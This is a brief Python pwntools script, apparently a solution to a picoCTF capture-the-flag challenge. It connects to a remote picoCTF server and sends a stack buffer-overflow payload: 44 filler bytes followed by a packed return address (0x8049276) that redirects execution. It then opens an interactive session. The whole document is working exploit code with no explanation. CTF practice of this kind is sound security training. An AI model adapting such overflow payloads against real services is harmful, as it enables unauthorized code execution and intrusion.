from pwn import *

# HOST, PORT = "127.0.0.1", 31337
HOST, PORT = 'dolphin-cove.picoctf.net', 55404
r = remote(HOST, PORT)

r.recvuntil(': ')
r.sendline(b'A' * 44 + p32(0x8049276))
r.interactive()